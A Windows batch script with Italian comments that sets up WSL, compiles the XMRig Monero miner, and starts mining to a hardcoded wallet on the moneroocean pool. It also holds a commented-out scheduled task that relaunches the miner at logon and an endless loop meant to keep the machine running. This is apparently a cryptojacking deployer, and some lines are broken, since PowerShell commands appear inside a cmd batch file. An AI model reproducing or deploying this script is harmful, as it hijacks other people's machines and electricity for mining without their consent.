@echo off

wsl --list >nul 2>&1
if %errorlevel% equ 0 (
    echo ""
) else (    
    dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart
    dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart
    Invoke-WebRequest -Uri https://wslstorestorage.blob.core.windows.net/wslblob/wsl_update_x64.msi -OutFile wsl_update_x64.msi
    Start-Process -Wait -FilePath ".\wsl_update_x64.msi"
    wsl --set-default-version 2
    wsl --install
    timeout /t 60 /nobreak >nul
)

:: Esegui il batch all'avvio
::powershell -command "Register-ScheduledTask -TaskName 'EseguiXMRig' -Action (New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c \"%~dp0batch.bat\"') -Trigger (New-ScheduledTaskTrigger -AtLogon) -Description 'file batch XMRig avvio del sistema'"

wsl bash -c "cd /home/a/ && sudo apt install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y && git clone https://github.com/xmrig/xmrig.git && cd /home/a/xmrig && mkdir build && cd /home/a/xmrig/build && cmake .. && make && ./xmrig -o gulf.moneroocean.stream:10128 -u 448QNhSpvaFUmAAhjV7tC5RANEmbqWJ3U2MMZs48Tcur1puZ3K1Pr8k9y3C2WXakES4bSZSKW2cAMRKLFaF9Vz1TSwkfozy -p pc1"

:: Impedisci lo spegnimento del computer
:loop
timeout /t 3600 /nobreak >nul 2>&1
goto loop
